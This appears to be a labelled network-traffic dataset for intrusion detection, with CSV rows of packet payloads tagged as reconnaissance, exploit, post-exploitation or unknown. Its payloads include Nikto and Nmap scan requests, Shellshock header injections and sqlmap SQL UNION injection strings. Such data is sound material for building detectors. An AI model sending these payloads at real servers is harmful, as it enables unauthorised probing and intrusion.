idx,s_ip,s_port,d_ip,d_port,protocol,payload,risk,class
265,188.147.45.245,36858,76.128.116.214,80,TCP( 6 ),GET /scgi-bin/cgiwrap/~nobody HTTP/1.1\r\nHost: 172.16.1.50\r\nContent-Length: 6\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)\r\nConnection: Keep-Alive\r\n\r\nMYDATAGET /cgi-bin-sdb/cgiwrap/~nobody HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nHost: 172.16.1.50\r\n\r\nMYDATAGET /cgi-mod/cgiwrap/~nobody HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)\r\n\r\nMYDATAGET /cgi.cgi/cgiwrap/~nobody4 HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nHost: 172.16.1.50\r\n\r\nMYDATAGET /webcgi/cgiwrap/~nobody4 HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)\r\nContent-Length: 6\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: 172.16.1.50\r\n\r\nMYDATAGET /cgi-914/cgiwrap/~nobody4 HTTP/1.1\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nContent-Length: 6\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nMYDATAGET /cgi-915/cgiwrap/~nobody4 HTTP/1.1\r\nHost: 172.16.1.50\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)\r\nConnection: Keep-Alive\r\n\r\nMYDATAGET /bin/cgiwrap/~nobody4 HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)\r\n\r\nMYDATAGET /cgi/cgiwrap/~nobody4 HTTP/1.1\r\nHost: 172.16.1.50\r\nContent-Length: 6\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)\r\nConnection: Keep-Alive\r\n\r\nMYDATAGET /mpcgi/cgiwrap/~nobody4 HTTP/1.1\r\nHost: 172.16.1.50\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)\r\nConnection: Keep-Alive\r\n\r\nMYDATAGET /cgi-bin/cgiwrap/~nobody4 HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)\r\nContent-Length: 6\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: 172.16.1.50\r\n\r\nMYDATAGET /ows-bin/cgiwrap/~nobody4 HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nHost: 172.16.1.50\r\n\r\nMYDATAGET /cgi-sys/cgiwrap/~nobody4 HTTP/1.1\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nContent-Length: 6\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nMYDATAGET /cgi-local/cgiwrap/~nobody4 HTTP/1.1\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\n\r\nMYDATAGET /htbin/cgiwrap/~nobody4 HTTP/1.1\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\n\r\nMYDATAGET /cgibin/cgiwrap/~nobody4 HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nHost: 172.16.1.50\r\n\r\nMYDATAGET /cgis/cgiwrap/~nobody4 HTTP/1.1\r\nContent-Length: 6\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)\r\n\r\nMYDATAGET /scripts/cgiwrap/~nobody4 HTTP/1.1\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nContent-Length: 6\r\nContent-Type: application/x-www-form-urlenc,2,1_reconnaissance
266,206.91.241.164,47760,25.242.88.179,48082,TCP,......(,2,4_unknown
267,165.193.141.189,35556,165.189.3.119,80,TCP( 6 ),GET /webcgi/ruby.rb HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /webcgi/search HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/search.cgi HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /webcgi/server.php HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/status HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\n\r\nGET /webcgi/sysinfo.pl HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/test HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/test-cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/test.cgi HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /webcgi/test_cgi.php HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/test.cgi.php HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/test_cgi.pl HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /webcgi/test-cgi.pl HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /webcgi/test.py HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/test.sh HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/tmUnblock.cgi HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /webcgi/uname.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/viewcvs.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/welcome HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Age,2,1_reconnaissance
268,171.102.68.99,41630,81.10.36.34,80,TCP( 6 ),GET /evox/about HTTP/1.1\r\nConnection: close\r\nHost: 172.16.1.50\r\nUser-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\r\n\r\n,1,1_reconnaissance
269,121.61.173.189,47760,33.253.252.126,59574,TCP,......(,2,4_unknown
270,110.115.162.104,47760,119.48.215.102,45064,TCP,......(,2,4_unknown
271,206.242.111.157,16322,210.97.217.214,80,TCP( 6 ),OPTIONS / HTTP/1.1\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nUser-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\r\n\r\nPROPFIND / HTTP/1.1\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nContent-Length: 0\r\nDepth: 1\r\nUser-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\r\n\r\nGET /HNAP1 HTTP/1.1\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nUser-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\r\n\r\nOPTIONS / HTTP/1.1\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nAccess-Control-Request-Method: CONNECT\r\nOrigin: example.com\r\nUser-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\r\n\r\n,1,1_reconnaissance
272,61.233.241.228,50130,23.216.82.171,5985,TCP( 6 ),"un..,<`.Z.T.59..a.X7....%..o..U...p.`..~o.......5C.p......H......\\*).w.Z....\\l.......o5[]...qZ..Vc...7m..C....#.1.+.....A..Pe..:..k......G7.]D ...1.:..x.....m.U.,.V.&......vNH......IF......U.c.)........G#+\nx.2v.....;.d..9Wdk.)...l.........^...N9........b9B-..a....gi.5N.X..9......s/..5........a..M\\.:S.C.1s.bq.k.].W..s......} <..96.h8....tb..XLdJGQ5....gX_H.kR......z.V-.-.'....`...Ht..q_......W.@.... W..N..... .-.Dv.m-.#.....P.bu..p....d.......^...p....r.......6}....3`0..M....$....Z{s.g{w'.....o#.f....`.-zu6.r..\rfx.P7..V.....X{b..-.3.....&8..rR.4...Z......r...L#...NI......1...Q!o+\n.....H.]$.9.2\""iQ.4....B..........v..p.`. ...n9?iH.Z...g\\ah.`B.+....*5%.1U.E@.=..v~R=....v...........1*..$I~....m.Z...r...m.W......B..C.TA}....,I...sT..s....&.~..d.......M\"".>y50Vx.T%...D&.'......t.....ZR.tz(.....Z...r_...+...T..y..v...V...;.......s.#+<&.BI...F.I.T..d!.o.3P..@m5C......y..3d.e..k.$X.#..]....G./..._[+.Y.?G.....UL.J..R!.q.7.F...............d..S.g5..zD_.....FF...[D..>....d..G.J2...--Encrypted Boundary--\r\nPOST /wsman?PSVersion=7.1.3 HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: multipart/encrypted;protocol=\""application/HTTP-SPNEGO-session-encrypted\"";boundary=\""Encrypted Boundary\""\r\nUser-Agent: Microsoft WinRM Client\r\nContent-Length: 1962\r\nHost: 172.16.1.71:5985\r\n\r\n--Encrypted Boundary\r\nContent-Type: application/HTTP-SPNEGO-session-encrypted\r\nOriginalContent: type=application/soap+xml;charset=UTF-8;Length=1707\r\n--Encrypted Boundary\r\nContent-Type: application/octet-stream\r\n......../..c.N.q....[..I.s...M...d.....<..%i.C..:.a.......w...............!.h...m.mk....E.6....._...2..l..lCia...#.y+..a...[......!G..3...j.,.c..t....ps0#.N..ik5...H....$m......e............%....xG.............w...R........c.WQ.kO...$.b...9$...z...W.W..^a.>^.....w.h../.->.5.Tb..jpQ..=..<~..Pr.....t..+.6.....$..yQ...3..V.d....0..p?#A...*..\n....;=.+.....%C.8b..GD....`.5....B..\\fv\\...W.`=x.6...d=OH_2...).)7>a.j.o..{..k[..\\.5a<..J......7.jPyW..Sd.i:. ....y.9..%..#^\n.y..\r.^i...... \"".&2.6R1..._....[.._/2.4x\\...I_.....XZ...j..d\nK..G.RR...8I1.//..VK..................&..4...d...P.]T.....I.....}U.B.Kw8t.)%.!th)........:.g.....Yj\r.l..F.+...._E...lN..+.mX....E.\\.V......<Q...y../...F.........Z..q.<..t.Y.n...'.[4..4o\rJn..c.......8.gs......@\\.Q..[.=.....l...L9c..*Q\n/.....Nf..U..-.%|.......R+...4...'*.H...;.'.....<..H..6.&.''...%..iE.;a.#..[.A......O..:.Oa5Y[w.........q..c..^v...K'..D.......t......D1.-Gkm..L3W&.........092\\......}...C.......|:.K55[....Y>.|P../.v5.1..H#T....../....J..C.X....m.?.h..S(.....t3...!.O...e.>..E.4V.<.....P..%x.....Nh.e.1m.......m.\""..9.....p&.._..l.W0....Y...o^.s..../..8..[-t..\""8..}..VMK,.8..1.tIo){..\\......H...-.*.u...._.i]..GK)E.R4....#E/l.U....c.\""......W.j.R...^....Z.(-.4..3).\n.k.(EJ.r..+>=.G..Y..>d......v....j(..?....L....Uu.Y`L|..6..$#.....5..Hh.k_.y.........}..pF..@O(&.(.B.S.i...O..y..0..&..h..'..B\""|6............C...M..R..8.LM.........1.v..1.......#......=d.F.K..}...M......|A..EV......YwC.~ww..L............T\""..y......5.s.l ..'4.5...8..^....U.s..V..|.,..}S9..A...QMWa.......!XV..-.......W.o......9Tz/\"".6u..n;_..W.....&q..,..2-...H..9~<i..u.?hR..g.R....8. ~....P=.@.#'....[A.|.M...g..WQ..2C..._.t..Da4f!q...o.R..B.l...P.o.G..^...U........l..M..x..,.!..]..'.f\"".....WE....b...U.t.......\n.@s.G--Encrypted Boundary--\r\nPOST /wsman?PSVersion=7.1.3 HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Type: multipart/encrypted;protocol=\""application/HTTP-SPNEGO-session-encrypted\"";boundary=\""Encrypted Boundary\""\r\nUser-Agent: Microsoft WinRM Client\r\nContent-Length: 1962\r\nHost: 172.16.1.71:5985\r\n\r\n--Encrypted Boundary\r\nContent-Type: application/HTTP-SPNEGO-session-encrypted\r\nOriginalContent: type=application/soap+xml;charset=UTF-8;Length=1707\r\n--Encrypted Boundary\r\nContent-Type: application/octet-stream\r\n.........5m..A.Q.....q.......ZE...U.....W.YJ...A>.EE.M..h.#8<&....DVzs`.]... m..........ui.).@,..8....g.$;.N.ny..;.....w.x......,.\n.|SW...C...*........h....7k.....K.Aa.>..H<..NI.9wF).3A5a.Y....v?..b6...Yn...3..5C\n.9.|i..V2.\"".x.u....t..#.v2....J..up....N.E.q......f.I.L.yHg....S.h.-.u..O..0.i...M.v.+..|..+'....-...D4....GS...\rT....6...~#.h@b<..<.Hu;,r.<..n..}..@H.z....g.O~.y........'..x.:",2,3_post
273,169.105.61.253,56462,120.72.128.145,80,TCP,"GET /?id=user%27%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.3.4#stable (http://sqlmap.org)
Host: 192.168.136.132
Referer: http://192.168.136.132:80
Cache-Control: no-cache

",1,2_exploit
274,55.254.215.196,47760,190.191.140.64,45598,TCP,......(,2,4_unknown
275,82.32.230.86,47760,50.119.133.38,34216,TCP,......(,2,4_unknown
276,133.33.197.215,60508,173.223.106.60,80,TCP,"GET /?id=-1470%22%29%29%29%20UNION%20ALL%20SELECT%205757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%2C5757%23 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.3.4#stable (http://sqlmap.org)
Host: 192.168.136.132
Referer: http://192.168.136.132:80
Cache-Control: no-cache

",1,2_exploit
277,161.180.242.165,80,50.128.42.254,55094,TCP,"HTTP/1.1 403 Forbidden
Date: Thu, 28 Jul 2022 08:20:24 GMT
Server: Apache/2.4.6 (CentOS)
Last-Modified: Thu, 16 Oct 2014 13:20:58 GMT
ETag: ""1321-5058a1e728280""
Accept-Ranges: bytes
Content-Length: 4897
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd""><html><head>
<meta http-equiv=""content-type"" content=""text/html; charset=UTF-8"">
..<title>Apache HTTP Server Test Page powered by CentOS</title>
..<meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-8"">

    <!-- Bootstrap -->
    <link href=""/noindex/css/bootstrap.min.css"" rel=""stylesheet"">
    <link rel=""stylesheet"" href=""noindex/css/open-sans.css"" type=""text/css"" />

<style type=""text/css""><!--.. 

body {
  font-family: ""Open Sans"", Helvetica, sans-serif;
  font-weight: 100;
  color: #ccc;
  background: rgba(10, 24, 55, 1);
  font-size: 16px;
}

h2, h3, h4 {
  font-weight: 200;
}

h2 {
  font-size: 28px;
}

.jumbotron {
  margin-bottom: 0;
  color: #333;
  background: rgb(212,212,221); /* Old browsers */
  background: radial-gradient(ellipse at center top, rgba(255,255,255,1) 0%,rgba(174,174,183,1) 100%); /* W3C */
}

.jumbotron h1 {
  font-size: 128px;
  font-weight: 700;
  color: white;
  text-shadow: 0px 2px 0px #abc,
               0px 4px 10px rgba(0,0,0,0.15),
               0px 5px 2px rgba(0,0,0,0.1),
               0px 6px 30px rgba(0,0,0,0.1);
}

.jumbotron p {
  font-size: 28px;
  font-weight: 100;
}

.main {
   background: white;
   color: #234;
   border-top: 1px solid rgba(0,0,0,0.12);
   padding-top: 30px;
   padding-bottom: 40px;
}

.footer {
   border-top: 1px solid rgba(255,255,255,0.2);
   padding-top: 30px;
}

    --></style>
</head>
<body>
  <div class=""jumbotron text-center"">
    <div class=""container"">
   .  <h1>Testing 123..</h1>
  ..<p class=""lead"">This page is used to test the proper operation of the <a href=""http://apache.org"">Apache HTTP server</a> after it has been installed. If you can read this page it means that this site is working properly. This server is powered by <a href=""http://centos.org"">CentOS</a>.</p>
..</div>
  </div>
  <div class=""main"">
    <div class=""container"">
       <div class=""row"">
  ...<div class=""col-sm-6"">
    ...<h2>Just visiting?</h2>
...  ..<p class=""lead"">The website you just visited is either experiencing problems or is undergoing routine maintenance.</p>
  .....<p>If you would like to let the administrators of this website know that you've seen this page instead of the page you expected, you should send them e-mail. In general, mail sent to the name ""webmaster"" and directed to the website's domain should reach the appropriate person.</p>
  .....<p>For example, if you experienced problems while visiting www.example.com, you should send e-mail to ""webmaster@example.com"".</p>
.  ...</div>
  ....<div class=""col-s",2,2_exploit
